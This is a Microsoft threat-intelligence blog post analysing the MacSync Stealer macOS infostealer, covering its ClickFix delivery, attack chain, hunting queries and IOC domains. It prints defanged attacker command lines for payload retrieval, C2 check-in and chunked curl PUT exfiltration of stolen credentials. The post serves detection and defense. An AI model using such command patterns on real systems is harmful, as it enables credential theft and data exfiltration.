---
categories:
- MS
- 보안
date: '2026-08-18T17:08:28+00:00'
description: "In this article\n\t\t\n\n\t\t\n\t\t\t\n\t\t\n\t\n\t\n\t\t\n\t\t\tActivity\
  \ overview Discovery of additional rotating infrastructure Attack chain overviewMitigation\
  \ and protection guidanc"
draft: false
original_url: https://www.microsoft.com/en-us/security/blog/2026/08/18/hunting-macsync-stealer-infrastructure-through-behavioral-pivots/
source: Microsoft Security Blog
tags:
- ClickFix
- Social engineering
title: Hunting MacSync Stealer infrastructure through behavioral pivots
---

In this article
		

		
			
		
	
	
		
			Activity overview Discovery of additional rotating infrastructure Attack chain overviewMitigation and protection guidanceReferencesLearn more		
	
	




MacSync Stealer is a macOS-focused information stealer that relies on changing infrastructure to deliver payloads, communicate with compromised devices, and exfiltrate data. Earlier reporting by RST Cloud identified the threat through a limited set of domains and documented rapid command-and-control (C2) replacement after public disclosure. 



Microsoft Defender Experts expanded that view by correlating recurring endpoints and network behaviors across the activity. This behavior-led approach connected more than 30 domains and showed that the infrastructure supported more than C2 communication, extending into active collection, staging, and exfiltration. The findings demonstrate that although domains may rotate quickly, repeated execution patterns, request characteristics, staging behavior, and upload methods provide defenders with more durable opportunities to investigate MacSync Stealer activity. 



Activity overview&nbsp;



Microsoft Defender Experts reviewed endpoint and network telemetry to determine which MacSync Stealer behaviors persisted as infrastructure changed. The investigation followed the activity from C2 communication through collection, staging, and exfiltration, using recurring technical traits to connect activity across rotating domains. Execution began from an interactive shell session consistent with ClickFix social engineering, where users are tricked into pasting or running commands in Terminal. The shell session used curl to retrieve attacker-controlled payload content, followed by script-driven execution and outbound communication.&nbsp;



After execution, the malware communicated with attacker-controlled infrastructure using recurring URI paths, macOS User-Agent strings, API-key headers, and curl command-line options. These request traits became durable behavioral pivots because they remained consistent even as domains changed. The activity then progressed into collection behavior targeting macOS Keychain material, browser data, locally stored credentials, cloud and Secure Shell (SSH) credentials, and sensitive files from common user directories.&nbsp;



The investigation also confirmed active data exfiltration, not just beaconing. Collected data was staged under temporary paths, compressed into an archive, split into chunks, and uploaded through HTTP PUT requests using curl with the &#8211;data-binary argument. Upload parameters such as upload_id, chunk_index, and total_chunks provided additional hunting opportunities that could be correlated with process, command-line, file, and network telemetry across the attack chain.&nbsp;



Discovery of additional rotating infrastructure&nbsp;



To identify related MacSync Stealer infrastructure, Microsoft Defender Experts required multiple endpoint and network behaviors to align before treating a domain as connected. Correlation focused on recurring traits across payload retrieval, C2 check-in, and exfiltration, including process ancestry, command-line patterns, request paths, headers, and upload parameters. Applying this standard linked more than 30 domains, making the domain count an outcome of the behavioral methodology rather than the primary finding.&nbsp;



The strongest pivots combined network request shape with endpoint execution context. Related infrastructure shared recurring URI patterns such as /curl/, /dynamic?txd=, and /gate?buildtxd=; curl command lines using -k, -s, &#8211;max-time, and &#8211;data-binary; macOS User-Agent strings; API-key headers; and HTTP PUT uploads that included upload_id, chunk_index, and total_chunks parameters. RST Cloud used recurring URI patterns to surface eleven additional candidate domains and found a static API-key value shared across four confirmed C2 domains while the build token rotated per deployment. Domains were treated as related when multiple behavioral traits aligned across process, command-line, and network telemetry, reducing reliance on any single domain indicator.&nbsp;



This finding reinforces a practical defender lesson: rotating infrastructure can weaken static domain blocking and retrospective IOC matching, but repeated request patterns and process behaviors create durable hunting opportunities. Figure 1 shows representative defanged command-line patterns used as pivots across payload retrieval, C2 check-in, and chunked upload activity.&nbsp;



Phase&nbsp;Representative behavioral pivot&nbsp;Why it matters&nbsp;Payload retrieval&nbsp;curl -kfsSL&nbsp;hxxp://[domain]/curl/[token]&nbsp;Identifies the initial payload retrieval pattern without depending on a single domain.&nbsp;C2 check-in&nbsp;curl -k -s &#8211;max-time 30&nbsp;-H &#8220;User-Agent: Mozilla/5.0 (Macintosh&#8230;)&#8221;&nbsp;-H &#8220;api-key: **********&#8221;&nbsp;hxxp://[domain]/dynamic?txd=[token]&nbsp;Combines endpoint command-line context with recurring request shape, headers, and URI paths.&nbsp;Chunked exfiltration&nbsp;curl -k -s -X PUT &#8211;data-binary @-&nbsp;-H &#8220;api-key: **********&#8221;&nbsp;hxxp://[domain]/gate?buildtxd=[token]&nbsp;&amp;upload_id=[id]&amp;chunk_index=[n]&amp;total_chunks=[n]&nbsp;Shows active data exfiltration and provides durable upload parameters for hunting across domains.&nbsp;



Figure 1. Representative behavioral pivots associated with MacSync Stealer payload retrieval, C2 check-in, and chunked HTTP PUT exfiltration. 



The same behavioral patterns used to identify additional infrastructure also map to the broader end-to-end activity observed on affected macOS devices.&nbsp;



Attack chain overview



The observed MacSync Stealer activity followed a fast, script-driven attack chain designed to execute quickly on macOS, collect high-value local data, stage the results, and exfiltrate the archive through rotating web infrastructure. This sequence matters because each phase produces telemetry that can be correlated across processes, command-line, file, and network events. Rather than relying on any individual domain, defenders can track the chain through recurring execution tools, URI paths, staging locations, and upload parameters.&nbsp;


MacSync Stealer attack chain showing payload execution, AppleScript-assisted activity, data collection, staging and compression, exfiltration through rotating infrastructure, and cleanup of temporary artifacts.



Phase&nbsp;Observed behavior&nbsp;Hunting value&nbsp;Payload retrieval&nbsp;Interactive shell launches curl to retrieve staged payload content.&nbsp;Correlate shell ancestry, curl command lines, and /curl/ retrieval paths.&nbsp;C2 check-in&nbsp;Requests use recurring URI paths, macOS User-Agent strings, and API-key headers.&nbsp;Track request shape across domains instead of matching domains alone.&nbsp;Collection and staging&nbsp;Credential, browser, cloud, SSH, and user-file data is collected and archived.&nbsp;Look for sensitive-file access followed by archive creation under temporary paths.&nbsp;Chunked exfiltration&nbsp;curl uploads staged archive chunks using HTTP PUT and &#8211;data-binary.&nbsp;Hunt for upload_id, chunk_index, total_chunks, and /gate?buildtxd= patterns.&nbsp;Cleanup&nbsp;Temporary archives, staging folders, and lock files are removed.&nbsp;Correlate deletion activity with preceding collection and outbound upload events.&nbsp;



Figure 2. MacSync Stealer attack chain showing payload retrieval, AppleScript-assisted execution, collection, staging, chunked exfiltration, and cleanup mapped to behavioral hunting opportunities. 



Phase 1: Initial access and payload execution



Observed execution began from an interactive zsh terminal session, where curl retrieved payload content over a /curl/ path before the payload was decoded or unpacked using native utilities such as Base64 and gunzip. This phase is useful for hunting because the combination of user-facing shell activity, curl retrieval, and unpacking behavior is more durable than any single download domain.&nbsp;



Phase 2: AppleScript-assisted execution



The payload used osascript to run AppleScript-assisted shell commands, blending macOS scripting with Unix command-line tooling. Observed activities included sh, cp, rm, curl, mkdir, and killall operations. This phase creates hunting value when osascript launches shell activity that quickly chains into network communication, staging, or cleanup behavior.&nbsp;



Phase 3: Discovery and data collection



After execution, the malware collected host and user information, enumerated running processes and system details, and checked for cryptocurrency wallet applications, including Ledger and Trezor-related local artifacts. It then targeted macOS Keychain material, browser Safe Storage keys, browser credentials, cookies, login databases, session data, IndexedDB, LevelDB, extension storage, Safari data, Apple Notes, SSH keys, AWS credentials, Kubernetes configurations, browser profiles, browsing history, and sensitive files from common user directories. The hunting value comes from correlating sensitive data access with the later staging and upload sequence.&nbsp;



Phase 4: Data staging and compression



Collected data was staged under /tmp/sync* paths and compressed into /tmp/osalogging.zip before uploading. The archive was split into multiple chunks, creating a repeatable staging and transfer pattern that defenders can correlate with preceding collection behavior and subsequent outbound curl traffic.&nbsp;



Phase 5: Exfiltration over rotating infrastructure



The staged archive was uploaded through rotating infrastructure using curl and HTTP PUT requests. Observed requests included &#8211;data-binary, API-key headers, macOS User-Agent string, upload_id values, chunk_index values, and total_chunks parameters. These upload traits confirmed active data exfiltration and provided durable hunting pivots even when domains rotated.&nbsp;



Phase 6: Cleanup and evidence removal



After exfiltration, the malware removed temporary archives, staging folders, lock files, and other artifacts. Although this cleanup reduced on-disk evidence, the sequence of archive creation, chunked upload, and deletion can still provide a useful behavioral correlation for defenders.&nbsp;



Mitigation and protection guidance



The attack chain findings point to three mitigation priorities.




Organizations should reduce the risk of user-initiated Terminal execution by educating users and using platform controls that interrupt suspicious paste-and-run workflows. Microsoft’s ClickFix reporting recommends educating users not to run commands from untrusted sources and monitoring suspicious Terminal or shell activity associated with these lures. 





Defenders should monitor post-execution behavior when initial prevention does not stop activity, including suspicious shell usage, AppleScript-assisted commands, curl-based payload retrieval, credential-store access, temporary staging paths, and archive creation.  





Detection should include exfiltration monitoring for HTTP PUT uploads, &#8211;data-binary usage, upload identifiers, chunk indexes, total chunk counts, and recurring /gate URI patterns that can reveal active data theft even when C2 domains rotate. 




In macOS 26.4 and later, Apple introduced protections designed to disrupt ClickFix-style attacks, including warnings that can block potentially malicious Terminal pastes and XProtect checks that can prevent detected malicious scripts from running.



When a user attempts to paste a potentially malicious command into Terminal, macOS displays a warning that blocks the paste and explains that scammers may use Terminal instructions to compromise the Mac or the user’s privacy.&nbsp;



“Possible malware, Paste blocked”&nbsp;



“Your Mac has not been harmed. Scammers often encourage pasting text into Terminal to try and harm your Mac or compromise your privacy. These instructions are commonly offered via websites, chat agents, apps, files, or a phone call.”&nbsp;



Organizations can also follow these recommendations to mitigate threats associated with this threat:&nbsp;




Reduce Terminal execution risk. Educate users not to paste or run Terminal commands from untrusted websites, chat messages, apps, files, or phone-based instructions. 





Monitor suspicious Terminal usage. Alert on unusual Terminal, zsh, or shell sessions that retrieve payloads, decode content, or execute commands shortly after user interaction. 





Detect native tool abuse. Flag unusual sequences of macOS utilities such as curl, Base64, gunzip, osascript, cp, rm, mkdir, and killall. 





Hunt for post-execution behavior. Correlate AppleScript-assisted shell activity, curl-based payload retrieval, credential-store access, temporary staging paths, archive creation, and cleanup behavior. 





Protect credential stores. Detect unauthorized access to Keychain material, browser credential stores, SSH keys, cloud credentials, and sensitive files in common user directories. 





Monitor data staging. Alert on sensitive artifact collection followed by compression, archive creation, or staging under temporary paths such as /tmp/sync*. 





Monitor exfiltration patterns. Identify curl-based HTTP PUT uploads that use &#8211;data-binary, API-key headers, upload_id, chunk_index, total_chunks, or recurring /gate URI patterns. 





Restrict suspicious outbound traffic. Block or investigate connections to suspicious, newly registered, or behaviorally related domains while continuing to hunt on request patterns that may persist after domains rotate. 




Microsoft also recommends the following mitigations to reduce the impact of this threat.&nbsp;




Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown threats. 





Enable network protection and web protection to help prevent connections to malicious websites, phishing pages, and attacker-controlled infrastructure used for malware delivery, command-and-control communication, and data exfiltration. 





Enable tamper protection to help prevent unauthorized changes to Microsoft Defender security settings and reduce the risk of attackers disabling or weakening endpoint protections. 




Microsoft Defender XDR detections&nbsp;



Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.&nbsp;



Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.&nbsp;



Tactic&nbsp;Observed activity&nbsp;Microsoft Defender coverage&nbsp;Execution&nbsp;User-initiated shell activity retrieves payload content with curl. Payload content is decoded or unpacked using base64 and gunzip. AppleScript and shell commands are executed through osascript and native macOS utilities.&nbsp;Microsoft Defender for Endpoint &#8211; Suspicious shell command execution &#8211; Obfuscation or deobfuscation activity &#8211; Executable permission added to file or directory &#8211; Suspicious AppleScript activity &#8211; Suspicious piped command launched &#8211; Suspicious file or information obfuscation detectedMicrosoft Defender Antivirus &#8211; Trojan:MacOS/SuspMalScript &#8211; Behavior:MacOS/SuspOsascriptExec &#8211; Behavior:MacOS/SuspDownloadFileExec &#8211; Behavior:MacOS/SuspiciousActivityGen Data Collection&nbsp;Malware collects browser credentials, cookies, session data, Keychain-related material, cloud credentials, SSH keys, Apple Notes, browser profiles, browsing history, and sensitive files from common user directories. Collected data is staged and archived before upload.&nbsp;Microsoft Defender for Endpoint &#8211; Suspicious access of sensitive files &#8211; Suspicious process collected datafrom local system &#8211; Enumeration of files with sensitive data &#8211; Suspicious archive creation &#8211; Suspicious path deletionMicrosoft Defender Antivirus &#8211; Behavior:MacOS/SuspPassSteal &#8211; Trojan:MacOS/SuspDecodeExec Defense Evasion&nbsp;Malware decodes or unpacks payload content and removes temporary archives, staging folders, lock files, and other artifacts after exfiltration.&nbsp;Microsoft Defender for Endpoint &#8211; Suspicious path deletion&#8211; Suspicious file or information obfuscation detected Credential Access&nbsp;Malware accesses Keychain-related material, browser Safe Storage keys, browser credential stores, locally stored credentials, SSH keys, and cloud credential files.&nbsp;Microsoft Defender for Endpoint &#8211; Suspicious access of sensitive files  &#8211; Unix credentials were illegitimately accessed Exfiltration&nbsp;Malware uploads staged archive chunks using curl with HTTP PUT, &#8211;data-binary, API-key headers, macOS User-Agent strings, upload_id, chunk_index, and total_chunks parameters.&nbsp;Microsoft Defender for Endpoint  &#8211; Possible data exfiltration using curl  Microsoft Defender Antivirus  &#8211; Behavior:MacOS/SuspInfoExfil  &#8211; Trojan:MacOS/SuspMacSyncExfil 



 Threat intelligence reports



Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat, malicious activity, infrastructure, and techniques discussed in this blog. These reports provide intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.&nbsp;



Microsoft Defender XDR Threat analytics



From ClickFix to code signed: the quiet shift of MacSync Stealer malware.&nbsp;



Microsoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the embedded experience in the Microsoft Defender portal to get more information about this threat.&nbsp;



Advanced hunting queries



The following advanced hunting queries can help identify MacSync Stealer behaviors observed with this threat. Use these queries as starting points and tune the time range, device scope, and allowlists for your environment.&nbsp;



Hunting objective: Identify rotating infrastructure by request shape



This query looks for curl-initiated network activity that matches recurring MacSync Stealer URI paths and upload parameters across domains.&nbsp;



DeviceNetworkEvents 
| where InitiatingProcessFileName =~ "curl" 
| where RemoteUrl has_any ("/curl/", "/dynamic?txd=", "/gate?buildtxd=", "upload_id=", "chunk_index=", "total_chunks=")



Hunting objective: Detect payload retrieval over /curl/ 



This query focuses on initial payload retrieval behavior where curl reaches a /curl/ path, helping identify delivery activity without relying on a specific domain.&nbsp;



DeviceNetworkEvents 
| where InitiatingProcessFileName =~ "curl" 
| where RemoteUrl has "/curl/" 



Hunting objective: Detect chunked exfiltration over curl HTTP PUT 



This query targets active exfiltration behavior by looking for curl HTTP PUT uploads that use &#8211;data-binary and chunked upload parameters.&nbsp;



DeviceNetworkEvents 
| where InitiatingProcessFileName =~ "curl" 
| where InitiatingProcessCommandLine has_all ("-X PUT", "--data-binary") 
| where RemoteUrl has_any ("upload_id=", "chunk_index=", "total_chunks=", "/gate?buildtxd=") 



Hunting objective: Find curl command lines with MacSync infrastructure traits 



This query searches endpoint process telemetry for curl command lines containing the headers, URI paths, and upload parameters used as durable behavioral pivots.&nbsp;



DeviceProcessEvents 
| where FileName =~ "curl" 
| where ProcessCommandLine has_any ("api-key", "/curl/", "/dynamic", "/gate", "--data-binary", "upload_id=", "chunk_index=", "total_chunks=", "%{http_code}") 



Hunting objective: Identify AppleScript-launched shell activity 



This query looks for osascript activity that launches shell commands or native utilities commonly seen in the observed post-execution chain.&nbsp;



DeviceProcessEvents 
| where FileName =~ "osascript" 
| where ProcessCommandLine has_any ("sh -c", "cp ", "rm ", "curl ", "mkdir ", "killall", "dscl") 



MITRE ATT&amp;CK techniques observed



The following MITRE ATT&amp;CK mappings reflect behaviors observed during the MacSync Stealer investigation. The mapping emphasizes the same behavioral pivots used throughout this blog, including shell and AppleScript-assisted execution, payload retrieval, credential and browser data theft, sensitive file collection, staging, chunked exfiltration, cleanup, and rotating infrastructure.&nbsp;



Execution&nbsp;




T1059.004 Command and Scripting Interpreter: Unix Shell | An interactive zsh terminal session was used to run curl commands, decode or unpack payload content with base64 and gunzip, and execute shell commands. 





T1105 Ingress Tool Transfer | curl downloaded payload content from attacker-controlled infrastructure using recurring payload retrieval paths. 




Discovery&nbsp;




T1082 System Information Discovery | The malware collected host and user information during environment discovery. 





T1057 Process Discovery | The malware enumerated running processes and system configuration before continuing collection and credential-access activity. 





T1518 Software Discovery | The malware checked for cryptocurrency wallet applications such as Ledger and Trezor. 




Credential Access&nbsp;




T1555.001 Credentials from Password Stores: Keychain | The malware created a temporary keychain-grabbing script, attempted to extract browser Safe Storage keys, and accessed or attempted to unlock the macOS Keychain. 





T1555.003 Credentials from Password Stores: Credentials from Web Browsers | The malware collected browser credentials, cookies, login databases, session data, IndexedDB, LevelDB, and extension storage from Chrome, Brave, Edge, Opera, Vivaldi, Arc, Chromium, and other browsers. 




Collection&nbsp;




T1005 Data from Local System | The malware searched Downloads, Documents, and Desktop and collected sensitive file types including PDF, DOCX, TXT, KEY, PEM, KDBX, OVPN, WALLET, and SEED files. 





T1552.001 Unsecured Credentials: Credentials in Files | The malware harvested SSH keys, AWS credentials, Kubernetes configurations, browser profiles, Apple Notes, Safari data, and other locally stored secrets. 





T1560.001 Archive Collected Data: Archive via Utility | Collected data was staged under /tmp/sync* and compressed into /tmp/osalogging.zip before upload. 




Command and Control&nbsp;




T1071.001 Application Layer Protocol: Web Protocols | C2 communication used web protocols with recurring paths such as /dynamic?txd= and /gate?buildtxd=, macOS User-Agent strings, API-key headers, and rotating domains. 




Exfiltration&nbsp;




T1041 Exfiltration Over C2 Channel | Collected data was uploaded to attacker-controlled infrastructure using recurring /gate URI patterns and chunked HTTP PUT requests. 





T1020 Automated Exfiltration | The malware automated upload activity using curl with HTTP PUT, &#8211;data-binary, upload identifiers, chunk_index, and total_chunks parameters. 





T1030 Data Transfer Size Limits | The archive was split into multiple chunks before upload, as shown by repeated chunk_index and total_chunks parameters in exfiltration requests. 




Defense Evasion&nbsp;




T1070.004 Indicator Removal: File Deletion | Temporary archives, staging folders, lock files, and other artifacts were removed after exfiltration. 





T1140 Deobfuscate/Decode Files or Information | Payload content was decoded or unpacked using base64 and gunzip before execution. 




Behavioral Hunting Pivots&nbsp;



The following command-line patterns, URL paths, and URL parameters were observed in activity consistent with MacSync Stealer. Use these durable behavioral pivots with process and network context to investigate related activity as infrastructure rotates; then use the point-in-time domain indicators in the IOC section to enrich and validate those findings.&nbsp;



Indicator&nbsp;Type&nbsp;Description&nbsp;-H &#8220;api-key:&#8221;&nbsp;Command-line parameter&nbsp;API-key header request pattern used in MacSync Stealer C2 communication.&nbsp;-H &#8220;User-Agent: Mozilla/5.0 (Macintosh&#8221;&nbsp;Command line parameters&nbsp;macOS User-Agent string used in outbound requests associated with the activity.&nbsp;-w %{http_code}&nbsp;Command line parameters&nbsp;Curl output pattern used to capture HTTP response codes during upload attempts.&nbsp;-X PUT &#8211;data-binary&nbsp;Command line parameters&nbsp;HTTP upload pattern associated with data-transfer and exfiltration behavior.&nbsp;curl -k -s &#8211;max-time&nbsp;Command line parameters&nbsp;Curl-based C2 check-in pattern that suppresses output, bypasses certificate validation, and limits connection time.&nbsp;/curl/&nbsp;URL path&nbsp;Payload retrieval path observed in MacSync Stealer command-line activity.&nbsp;/dynamic?txd=&nbsp;URL path&nbsp;Recurring MacSync Stealer URI pattern used for C2 and infrastructure hunting.&nbsp;/gate?buildtxd=&nbsp;URL path&nbsp;Recurring MacSync Stealer URI pattern associated with chunked HTTP PUT data exfiltration.&nbsp;chunk_index=&nbsp;URL parameter&nbsp;Chunk index parameter observed in repeated upload requests.&nbsp;total_chunks=&nbsp;URL parameter&nbsp;Total chunk count parameter observed in chunked upload activity.&nbsp;upload_id=&nbsp;URL parameter&nbsp;Upload session parameter observed during chunked data-transfer activity.&nbsp;



Indicators of compromise (IOC)



The following domain indicators were observed in activity consistent with MacSync Stealer. Treat them as point-in-time evidence: use them to enrich and validate matches from the behavioral pivots above, and correlate any hits with process and network context because related infrastructure may rotate quickly.&nbsp;



Indicator&nbsp;Type&nbsp;Description&nbsp;aihealthring [.]com&nbsp;Domain&nbsp;Domain observed in activity consistent with MacSync Stealer; use matches to enrich and validate findings from the behavioral pivots above, correlated with process and network context.&nbsp;cabinrentalsnc [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;chatbasedos [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;commercialroofingsd [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;dogtrainersgeorgia [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;fintelliganceai [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;homeinspectionsdelaware [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;intopython [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;lalandscapelighting [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;lumenagnet [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;marbellaresales [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;miamipcsupport [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;moldinspectiondayton [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;nailscanai [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;newjerseypetsitter [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;numericagent [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;oaklandwaterdamage [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;oklahomawarehousing [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;olympiapetemergency [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;peaecagent [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;plasmaticsystems [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;plethorawallet [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;premierrentalpurchase [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;ricewaterbeauty [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;rvieragent [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;sandiegotkd [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;secueragent [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;shiledagent [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;syracusefertilitycenter [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;vastbets [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;wvaeagent [.]com&nbsp;Domain&nbsp;Related MacSync Stealer infrastructure identified through behavioral hunting.&nbsp;



References



References used for external context and related defensive guidance:&nbsp;




MacSync Stealer: C2 Infrastructure Rotation &#8211; RST Cloud. RST Cloud, May 8, 2026. 





ClickFix campaign uses fake macOS utilities lures to deliver &#8230;. Microsoft, May 6, 2026. 





Protecting against malware in macOS &#8211; Apple Support  December 19, 2024 




Learn more



For the latest security research from the Microsoft Threat Intelligence community, check out the&nbsp;Microsoft Threat Intelligence Blog.



To get notified about new publications and to join discussions on social media, follow us on&nbsp;LinkedIn,&nbsp;X (formerly Twitter), and&nbsp;Bluesky.



To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the&nbsp;Microsoft Threat Intelligence podcast.



Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.  &nbsp;




Learn more about securing Copilot Studio agents with Microsoft Defender  



Evaluate your AI readiness with our latest Zero Trust for AI workshop.



Microsoft 365 Copilot AI security documentation 



How Microsoft discovers and mitigates evolving attacks against AI guardrails 

The post Hunting MacSync Stealer infrastructure through behavioral pivots appeared first on Microsoft Security Blog.

---
*원문: [https://www.microsoft.com/en-us/security/blog/2026/08/18/hunting-macsync-stealer-infrastructure-through-behavioral-pivots/](https://www.microsoft.com/en-us/security/blog/2026/08/18/hunting-macsync-stealer-infrastructure-through-behavioral-pivots/)*
